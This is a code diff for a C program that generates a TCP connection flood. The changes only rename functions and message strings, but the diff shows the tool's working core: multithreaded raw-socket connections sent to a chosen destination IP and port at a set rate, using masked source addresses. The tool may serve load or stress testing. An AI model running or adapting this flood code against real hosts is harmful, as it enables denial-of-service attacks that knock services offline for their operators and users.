@@ -22,15 +22,15 @@ pthread_cond_t g_conn_cond = PTHREAD_COND_INITIALIZER;
 struct timespec g_conn_before_time;
 struct timespec g_conn_now_time;
 
-void conn_flood_print_usage(void)
+void ConnectionFloodPrintUsage(void)
 {
 	printf(
-			"CONN flood Usage : "
+			"kConnectionFlooding flood Usage : "
 			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
 	return;
 }
 
-void *generate_conn_flood(void *data)
+void *GenerateConnFlood(void *data)
 {
 	srand(time(NULL));
 	int thread_id = *((int*) data);
@@ -44,10 +44,10 @@ void *generate_conn_flood(void *data)
 			pthread_cond_wait(&g_conn_cond, &g_conn_mutex);
 		}
 		// get now resource
-		get_masking_arguments(&g_conn_input, &g_conn_now);
+		GetMaskingArguments(&g_conn_input, &g_conn_now);
 		// make and do tcp connection using raw socket
 		int src_port, seq, ack;
-		int sock = tcp_make_connection(
+		int sock = MakeTcpConnection(
 				inet_addr(g_conn_now.src),
 				inet_addr(g_conn_now.dest),
 				&src_port,
@@ -56,7 +56,7 @@ void *generate_conn_flood(void *data)
 				&ack,
 				0);
 		// time checking
-		time_check(
+		TimeCheck(
 				&g_conn_cond,
 				&g_conn_before_time,
 				&g_conn_now_time,
@@ -71,11 +71,11 @@ void *generate_conn_flood(void *data)
 	return 0;
 }
 
-void *conn_flood_time_check(void *data)
+void *ConnectionFloodTimeCheck(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_conn_mutex);
-		time_check(
+		TimeCheck(
 				&g_conn_cond,
 				&g_conn_before_time,
 				&g_conn_now_time,
@@ -85,7 +85,7 @@ void *conn_flood_time_check(void *data)
 	return NULL;
 }
 
-void conn_flood_main(char *argv[])
+void ConnFloodMain(char *argv[])
 {
 	int argc = 0;
 	srand(time(NULL));
@@ -93,11 +93,11 @@ void conn_flood_main(char *argv[])
 		argc++;
 	}
 	if (argc != 4) {
-		conn_flood_print_usage();
+		ConnectionFloodPrintUsage();
 		return;
 	}
 	// parse args
-	argv_to_input_arguments(argv, &g_conn_input);
+	ArgvToInputArguments(argv, &g_conn_input);
 	g_conn_num_generated_in_sec = 0;
 	g_conn_num_total = 0;
 	// initialize timespecs
@@ -111,23 +111,23 @@ void conn_flood_main(char *argv[])
 	for (int i = 0; i < num_threads; i++) {
 		thread_ids[i] = i;
 	}
-	printf("Sending CONN requests to %s using %d threads\n", g_conn_input.dest,
+	printf("Sending kConnectionFlooding requests to %s using %d threads\n", g_conn_input.dest,
 			num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
 		pthread_create(
 				&threads[i],
 				NULL,
-				generate_conn_flood,
+				GenerateConnFlood,
 				(void *)&thread_ids[i]);
 	}
-	pthread_create(&threads[i], NULL, conn_flood_time_check, NULL);
+	pthread_create(&threads[i], NULL, ConnectionFloodTimeCheck, NULL);
 	for (int i = 0; i < num_threads; i++) {
 		pthread_join(threads[i], NULL);
 		printf("thread %d joined\n", i);
 	}
 	pthread_mutex_destroy(&g_conn_mutex);
-	printf("CONN flood finished\nTotal %lu packets sent.\n", g_conn_num_total);
+	printf("kConnectionFlooding flood finished\nTotal %lu packets sent.\n", g_conn_num_total);
 	pthread_exit(NULL);
 	return;
 }
